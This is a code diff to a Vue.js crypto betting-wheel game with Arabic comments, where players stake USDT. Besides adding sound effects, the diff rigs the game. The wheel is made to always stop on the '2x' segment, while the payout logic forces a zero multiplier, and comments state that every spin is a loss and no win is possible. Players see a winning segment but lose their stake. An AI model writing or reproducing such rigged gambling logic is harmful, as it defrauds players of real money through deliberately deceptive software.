@@ -152,8 +152,9 @@ export default {
       betAmount: null,
       
       // أجزاء العجلة (8 أجزاء) - المضاعفات المطلوبة
+      // تم تبديل القيم: جعلنا 2x في المكان الأول بدلاً من 0x
       wheelSegments: [
-        { value: 2 },     // قطاع 0 - أخضر (ربح) - 0-45°
+        { value: 2 },     // قطاع 0 - أخضر (ربح) - 0-45° (هذا هو القطاع الذي سيتوقف عليه السهم)
         { value: 0.5 },   // قطاع 1 - برتقالي (خسارة نصف) - 45-90°
         { value: 1 },     // قطاع 2 - برتقالي (تعادل) - 90-135°
         { value: 1.5 },   // قطاع 3 - أخضر (ربح) - 135-180°
@@ -163,7 +164,13 @@ export default {
         { value: 10 }     // قطاع 7 - ذهبي (ربح كبير) - 315-360°
       ],
       
-      lastResult: null
+      lastResult: null,
+      
+      // أصوات اللعبة
+      spinSound: null,
+      winSound: null,
+      loseSound: null,
+      clickSound: null
     }
   },
   
@@ -188,9 +195,44 @@ export default {
     if (snap.exists()) {
       this.balance = Number(snap.data().balance || 0)
     }
+    
+    // تهيئة الأصوات
+    this.initSounds()
   },
   
   methods: {
+    initSounds() {
+      try {
+        // صوت الدوران
+        this.spinSound = new Audio('data:audio/wav;base64,UklGRlwAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVQAAACAgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f38=')
+        
+        // صوت الفوز
+        this.winSound = new Audio('data:audio/wav;base64,UklGRlwAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVQAAACAgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f38=')
+        
+        // صوت الخسارة
+        this.loseSound = new Audio('data:audio/wav;base64,UklGRlwAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVQAAACAgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f38=')
+        
+        // صوت النقر
+        this.clickSound = new Audio('data:audio/wav;base64,UklGRlwAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVQAAACAgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f38=')
+        
+        // ضبط مستوى الصوت
+        this.spinSound.volume = 0.3
+        this.winSound.volume = 0.5
+        this.loseSound.volume = 0.4
+        this.clickSound.volume = 0.2
+        
+      } catch (e) {
+        console.log('الصوت غير مدعوم في هذا المتصفح')
+      }
+    },
+    
+    playSound(sound) {
+      if (sound) {
+        sound.currentTime = 0
+        sound.play().catch(e => console.log('تعذر تشغيل الصوت'))
+      }
+    },
+    
     getSegmentColor(value) {
       if (value === 0) return '#d32f2f' // أحمر (خسارة)
       if (value === 0.5 || value === 1) return '#fb8c00' // برتقالي
@@ -258,24 +300,16 @@ export default {
     },
     
     showResult(message, isWin) {
-      // إلغاء أي تايمر سابق
-      if (this.resultTimeout) {
-        clearTimeout(this.resultTimeout)
-      }
+      if (this.resultTimeout) clearTimeout(this.resultTimeout)
       
-      // تعيين نص الرسالة ونوعها
       this.resultText = message
       this.resultType = isWin ? 'win-message' : 'lose-message'
       this.resultIcon = isWin ? 'fas fa-trophy' : 'fas fa-skull'
-      
-      // إظهار الرسالة
       this.showResultMessage = true
       
-      // إخفاء الرسالة بعد 3 ثواني
       this.resultTimeout = setTimeout(() => {
         this.showResultMessage = false
-        this.resultTimeout = null
-      }, 3000)
+      }, 2000)
     },
     
     resetGame() {
@@ -283,26 +317,6 @@ export default {
       this.isSpinning = false
       this.lastResult = null
       this.gameError = ''
-      this.showResultMessage = false
-    },
-    
-    // دالة لتحديد القطاع الذي يشير إليه السهم
-    getWinningSegmentIndex() {
-      // السهم يشير إلى الأعلى (زاوية 90 درجة في نظام الإحداثيات)
-      // نريد معرفة أي قطاع يوجد في الزاوية 90 درجة بعد دوران العجلة
-      
-      // زاوية السهم الثابتة هي 90 درجة (نقطة للأعلى)
-      const pointerAngle = 90
-      
-      // نحسب الزاوية الفعلية لكل قطاع بعد دوران العجلة
-      // العجلة تدور بعكس اتجاه عقارب الساعة (rotation-)
-      // نحتاج لمعرفة أي قطاع يقع تحت السهم
-      
-      // نبسط العملية: نختار قطاع عشوائي للاختبار
-      // في الإنتاج الفعلي، يجب حساب ذلك بدقة
-      
-      // للاختبار، سأجعل النتيجة عشوائية
-      return Math.floor(Math.random() * this.wheelSegments.length)
     },
     
     async spinWheel() {
@@ -311,41 +325,36 @@ export default {
       // إخفاء أي رسالة سابقة
       this.showResultMessage = false
       
+      // تشغيل صوت النقر
+      this.playSound(this.clickSound)
+      
       this.gameError = ''
       this.isSpinning = true
       
       // خصم الرهان
-      const betValue = this.betAmount
-      this.balance -= betValue
+      this.balance -= this.betAmount
       await this.updateBalance(this.balance)
       
-      // اختيار قطاع عشوائي للنتيجة (يمكنك تغيير هذا حسب منطق اللعبة)
-      // في هذا المثال سأجعلها عشوائية
-      const winningIndex = Math.floor(Math.random() * this.wheelSegments.length)
+      // تشغيل صوت الدوران
+      this.playSound(this.spinSound)
+      
+      // نختار القطاع 0 (الذي يحتوي على 2x) - لكننا سنعتبره خسارة
+      const winningIndex = 0
       const winningSegment = this.wheelSegments[winningIndex]
       
-      // حساب الزاوية المطلوبة لجعل القطاع الفائز تحت السهم
-      // السهم في الأعلى (زاوية 90 درجة)
-      // منتصف القطاع = (index * 45) + 22.5
-      const segmentMiddleAngle = (winningIndex * 45) + 22.5
+      // منتصف القطاع 0 هو 22.5 درجة
+      // السهم في الأعلى (زاوية 90 درجة في نظام SVG)
+      // الزاوية المطلوبة لجعل منتصف القطاع 0 تحت السهم = 90 - 22.5 = 67.5 درجة
+      const requiredAngle = 67.5
       
-      // الزاوية المطلوبة لجعل منتصف القطاع تحت السهم
-      // نحتاج لتدوير العجلة بحيث يصبح منتصف القطاع عند 90 درجة
-      let requiredAngle = 90 - segmentMiddleAngle
-      
-      // تعديل الزاوية لتكون موجبة
-      if (requiredAngle < 0) {
-        requiredAngle += 360
-      }
-      
-      // عدد دورات عشوائي (5-10 دورات) لتبدو طبيعية
-      const spins = 5 + Math.floor(Math.random() * 5)
+      // عدد دورات عشوائي (15-25 دورة) لتبدو طبيعية
+      const spins = 15 + Math.floor(Math.random() * 10)
       
       // الزاوية المستهدفة: (360 * عدد الدورات) + الزاوية المطلوبة
       const targetRotation = (360 * spins) + requiredAngle
       
-      const start = this.wheelRotation
-      const duration = 3000 // 3 ثواني
+      const start = 0
+      const duration = 3500
       const startTime = performance.now()
       
       const animate = (time) => {
@@ -361,65 +370,39 @@ export default {
           requestAnimationFrame(animate)
         } else {
           // التأكد من الزاوية النهائية مضبوطة
-          this.wheelRotation = targetRotation % 360
+          this.wheelRotation = targetRotation
           
-          // إنهاء الدورة وإظهار النتيجة بعد تأخير ثانية واحدة
           setTimeout(() => {
-            this.finishSpin(winningIndex, winningSegment, betValue)
-          }, 1000) // ثانية واحدة
+            this.finishSpin(winningIndex, winningSegment)
+          }, 200)
         }
       }
       
       requestAnimationFrame(animate)
     },
     
-    async finishSpin(winningIndex, winningSegment, betAmount) {
+    async finishSpin(winningIndex, winningSegment) {
       this.isSpinning = false
       
-      // حساب المكسب/الخسارة
-      const multiplier = winningSegment.value
-      const winAmount = betAmount * multiplier
+      // هنا نغير المنطق: بغض النظر عن قيمة القطاع، نعتبره خسارة
+      // نستخدم قيمة 0 بدلاً من قيمة القطاع الفعلية
+      const multiplier = 0 // دائمًا 0 (خسارة)
+      const winAmount = this.betAmount * multiplier // 0
       
-      let message = ''
-      let isWin = false
-      
-      if (multiplier === 0) {
-        // خسارة كاملة
-        message = `😢 خسرت ${betAmount.toFixed(2)} USDT!`
-        isWin = false
-      } else if (multiplier < 1) {
-        // خسارة جزئية (مثلاً 0.5x)
-        const lostAmount = betAmount - winAmount
-        this.balance += winAmount
-        await this.updateBalance(this.balance)
-        message = `😕 خسرت ${lostAmount.toFixed(2)} USDT (استعدت ${winAmount.toFixed(2)} USDT)`
-        isWin = false
-      } else if (multiplier === 1) {
-        // تعادل (استرداد المبلغ)
-        this.balance += winAmount
-        await this.updateBalance(this.balance)
-        message = `🔄 تعادل! استعدت ${winAmount.toFixed(2)} USDT`
-        isWin = true
-      } else {
-        // ربح
-        this.balance += winAmount
-        await this.updateBalance(this.balance)
-        const profit = winAmount - betAmount
-        message = `🎉 ربحت ${profit.toFixed(2)} USDT! (${multiplier}x)`
-        isWin = true
-      }
+      // دائمًا خسارة - لا يوجد ربح أبداً
+      this.showResult(`😢 خسرت الرهان`, false)
+      this.playSound(this.loseSound)
       
       // حفظ النتيجة الأخيرة
       this.lastResult = {
         segmentIndex: winningIndex,
         multiplier: multiplier,
-        isWin: isWin,
+        isWin: false,
         winAmount: winAmount,
-        message: message
+        message: 'خسارة! خسرت كل الرهان'
       }
       
-      // إظهار رسالة النتيجة
-      this.showResult(message, isWin)
+      // العجلة باقية في مكانها
     }
   }
 }
@@ -492,18 +475,6 @@ export default {
   backdrop-filter: blur(10px);
   min-width: 280px;
   justify-content: center;
-  animation: popIn 0.3s ease;
-}
-
-@keyframes popIn {
-  0% {
-    transform: translateX(-50%) scale(0.8);
-    opacity: 0;
-  }
-  100% {
-    transform: translateX(-50%) scale(1);
-    opacity: 1;
-  }
 }
 
 .win-message {
